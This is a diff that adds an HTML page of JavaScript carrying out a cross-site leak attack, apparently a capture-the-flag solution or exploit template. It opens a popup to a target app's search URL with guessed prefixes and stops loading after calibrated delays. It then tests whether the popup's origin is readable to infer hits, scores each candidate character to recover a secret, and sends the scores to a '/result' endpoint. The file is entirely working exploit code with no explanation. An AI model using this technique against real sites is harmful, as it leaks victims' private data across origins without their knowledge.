@@ -1,0 +1,115 @@
+<!doctype html>
+<script>
+const APP_URL = __APP_URL__;
+const PREFIX = __PREFIX__;
+const CHARSET = __CHARSET__;
+const ROUNDS = __ROUNDS__;
+const CALIBRATION_ROUNDS = __CALIBRATION_ROUNDS__;
+const VERIFY_ROUNDS = __VERIFY_ROUNDS__;
+const STOP_DELAYS = __STOP_DELAYS__;
+const MISS_SUFFIX = "~";
+
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+async function resetProbe(popup) {
+  try {
+    popup.location = "about:blank#" + Math.random().toString(16).slice(2);
+  } catch {}
+  await sleep(70);
+}
+
+async function probeOnce(popup, query, delay) {
+  const url = `${APP_URL}?q=${encodeURIComponent(query)}&_=${Math.random().toString(16).slice(2)}`;
+
+  popup.location = url;
+  setTimeout(() => {
+    try {
+      popup.stop();
+    } catch {}
+  }, delay);
+
+  await sleep(delay + 50);
+
+  let committed = true;
+  try {
+    popup.origin;
+    committed = false;
+  } catch {}
+
+  await resetProbe(popup);
+  return committed ? 1 : 0;
+}
+
+async function scoreQuery(popup, query, delay, rounds) {
+  let hits = 0;
+  for (let i = 0; i < rounds; i++) {
+    hits += await probeOnce(popup, query, delay);
+    await sleep(30);
+  }
+  return hits;
+}
+
+async function chooseDelay(popup) {
+  let bestDelay = STOP_DELAYS[0];
+  let bestGap = -1;
+
+  for (const delay of STOP_DELAYS) {
+    const hitScore = await scoreQuery(popup, PREFIX, delay, CALIBRATION_ROUNDS);
+    const missScore = await scoreQuery(
+      popup,
+      PREFIX + MISS_SUFFIX,
+      delay,
+      CALIBRATION_ROUNDS,
+    );
+    const gap = hitScore - missScore;
+
+    if (gap > bestGap) {
+      bestGap = gap;
+      bestDelay = delay;
+    }
+  }
+
+  return bestDelay;
+}
+
+async function main() {
+  const popup = window.open("about:blank", "_blank");
+  if (!popup) {
+    return;
+  }
+
+  await sleep(100);
+
+  const delay = await chooseDelay(popup);
+  const verifyHit = await scoreQuery(popup, PREFIX, delay, VERIFY_ROUNDS);
+  const verifyMiss = await scoreQuery(
+    popup,
+    PREFIX + MISS_SUFFIX,
+    delay,
+    VERIFY_ROUNDS,
+  );
+
+  const scores = {};
+  for (const ch of CHARSET) {
+    scores[ch] = await scoreQuery(popup, PREFIX + ch, delay, ROUNDS);
+  }
+
+  navigator.sendBeacon(
+    "/result",
+    JSON.stringify({
+      p: PREFIX,
+      d: delay,
+      h: verifyHit,
+      m: verifyMiss,
+      r: ROUNDS,
+      s: scores,
+    }),
+  );
+
+  try {
+    popup.close();
+  } catch {}
+}
+
+main();
+</script>
